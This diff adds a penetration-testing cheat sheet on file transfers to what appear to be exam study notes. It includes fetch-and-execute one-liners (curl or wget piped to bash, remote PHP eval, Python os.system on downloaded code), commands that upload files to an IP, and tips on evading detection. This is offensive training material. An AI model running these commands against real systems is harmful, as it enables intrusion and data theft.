@@ -303,6 +303,81 @@ Understanding file transfers using code helps in:
 ---
 
 ### Cheatsheet
+---
 
+## 🧠 Code-Based File Transfer Cheat Sheet (Table Mode)
 
+### 📥 Download Methods
 
+|Language / Tool|Command (Example)|Notes / When to Use|
+|---|---|---|
+|**Python 2**|`python2.7 -c 'import urllib;urllib.urlretrieve("URL","file")'`|Legacy systems|
+|**Python 3**|`python3 -c 'import urllib.request;urllib.request.urlretrieve("URL","file")'`|Most modern Linux|
+|**PHP**|`php -r '$f=file_get_contents("URL");file_put_contents("file",$f);'`|Web servers|
+|**Ruby**|`ruby -e 'require "net/http";File.write("file",Net::HTTP.get(URI("URL")))'`|Often installed|
+|**Perl**|`perl -e 'use LWP::Simple;getstore("URL","file");'`|Old but reliable|
+|**wget**|`wget URL -O file`|Common on Linux|
+|**curl**|`curl -o file URL`|Works almost everywhere|
+|**JavaScript (Windows)**|`cscript wget.js URL file`|PowerShell blocked|
+|**VBScript (Windows)**|`cscript wget.vbs URL file`|LOLBin, stealthy|
+|**SCP**|`scp user@IP:/path/file .`|SSH allowed|
+
+---
+
+### ⚡ Fileless Execution (No Disk Write)
+
+|Tool|Command|Why It Matters|
+|---|---|---|
+|**curl**|`curl URL \| bash`|Fast, stealth|
+|**wget**|`wget -qO- URL \| bash`|Quiet execution|
+|**PHP**|`php -r '@file("URL") && array_map("eval",file("URL"));'`|Webshell-friendly|
+|**Python 3**|`python3 -c 'import urllib.request,os;os.system(urllib.request.urlopen("URL").read().decode())'`|Full in-memory|
+
+---
+
+### 📤 Upload Methods
+
+|Language / Tool|Command (Example)|Requirements|
+|---|---|---|
+|**Python 3**|`python3 -c 'import requests;requests.post("http://IP:8000/upload",files={"files":open("file","rb")})'`|uploadserver|
+|**curl**|`curl -X POST http://IP/upload -F 'files=@file'`|HTTP allowed|
+|**SCP**|`scp file user@IP:/path/`|SSH outbound|
+|**FTP (scripted)**|`ftp -n -s:ftp.txt`|FTP allowed|
+
+---
+
+### 🔁 Base64 (No Network Required)
+
+|Direction|Command|Platform|
+|---|---|---|
+|Encode|`base64 file -w 0`|Linux|
+|Decode|`echo BASE64 \| base64 -d > file`|Linux|
+|Encode|`[Convert]::ToBase64String((Get-Content file -Encoding Byte))`|Windows|
+|Decode|`[IO.File]::WriteAllBytes("file",[Convert]::FromBase64String("BASE64"))`|Windows|
+
+---
+
+### 🧰 Quick Decision Table
+
+|Situation|Best Method|
+|---|---|
+|PowerShell blocked|JS / VBScript|
+|No tools available|Base64|
+|Disk writes risky|Fileless (pipe)|
+|Need upload|Python + requests|
+|Legacy Linux|Perl / PHP|
+|SSH allowed|SCP|
+
+---
+
+### 🎯 Exam & Real-World Tips
+
+- Always try **fileless first**
+    
+- Use **what’s already installed**
+    
+- Expect **Python → PHP → Perl fallback**
+    
+- Uploads require **server setup first**
+    
+- Touching disk = **higher detection**
